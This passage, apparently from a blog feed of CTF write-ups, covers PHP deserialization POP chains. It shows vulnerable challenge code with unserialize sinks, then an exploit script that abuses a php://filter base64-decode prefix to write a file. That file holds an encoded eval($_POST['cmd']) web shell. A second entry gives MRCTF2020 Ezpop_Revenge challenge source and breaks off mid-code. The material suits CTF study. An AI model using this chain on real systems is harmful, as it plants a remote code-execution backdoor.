punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> int <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// åˆ›å»ºå¤±è´¥</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//æ•°æ®åŽ‹ç¼©</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span> <span class="token operator">=</span> "<span class="token delimiter">&lt;?php</span>\<span class="token package">n</span><span class="token comment" spellcheck="true">//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>exp:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string">'exp.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$options</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=";</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'strval'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string">'2'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> popé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020ï¼šEzpop_Revenge</title>
      <link href="2021/10/04/mrctf2020-ezpop-revenge/"/>
      <url>2021/10/04/mrctf2020-ezpop-revenge/</url>
      
        <content type="html"><![CDATA[<p><strong>flag.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"MRCTF{******}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"æˆ‘æ‰Œyour problem?\nonly localhost can get flag!"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>plugin.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">HelloWorld_DB</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"MRCTF{this_is_a_fake_flag}"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$coincidence</span><span class="token punctuation">;</span>    <span class="token keyword">function</span>  <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">coincidence</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">coincidence</span><span class="token punctuation">[</span><span class="token string">'world'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HelloWorld_Plugin</span> <span class="token keyword">implements</span> <span class="token class-name">Typecho_Plugin_Interface</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'C0incid3nc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/file|assert|eval|[`\'~^?&lt;>$%]+/i"</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'C0incid3nc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'C0incid3nc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"Not that easy."</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>/var/IXR/Typecho/Db.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token string">'typecho_'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/** èŽ·å–é€‚é…å™¨åç§° */</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapterName</span> <span class="token operator">=</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/** æ•°æ®åº“é€‚é…å™¨ */</span>        <span class="token variable">$adapterName</span> <span class="token operator">=</span> <span class="token string">'Typecho_Db_Adapter_'</span> <span class="token punctuation">.</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token string">'isAvailable'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Exception</span><span class="token punctuation">(</span><span class="token string">"Adapter {$adapterName} is not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//__toString()</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_prefix</span> <span class="token operator">=</span> <span class="token variable">$prefix</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_pool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_connectedPool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//å®žä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$adapterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>/var/IXR/Typecho/Db/Query.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Typecho_Db_Query</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$_default</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'action'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'table'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'fields'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'*'</span><span class="token punctuation">,</span>        <span class="token string">'join'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'where'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'limit'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'offset'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'order'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'group'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'having'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>        <span class="token string">'rows'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_sqlPreBuild</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">SELECT</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSelect</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">INSERT</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'INSERT INTO '</span>                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span>                <span class="token punctuation">.</span> <span class="token string">'('</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">')'</span>                <span class="token punctuation">.</span> <span class="token string">' VALUES '</span>                <span class="token punctuation">.</span> <span class="token string">'('</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token function">array_values</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">')'</span>                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">DELETE</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'DELETE FROM '</span>                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span>                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UPDATE</span><span class="token punctuation">:</span>                <span class="token variable">$columns</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'rows'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$columns</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"$key = $val"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> <span class="token string">'UPDATE '</span>                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span>                <span class="token punctuation">.</span> <span class="token string">' SET '</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">' , '</span><span class="token punctuation">,</span> <span class="token variable">$columns</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span><span class="token punctuation">[</span><span class="token string">'where'</span><span 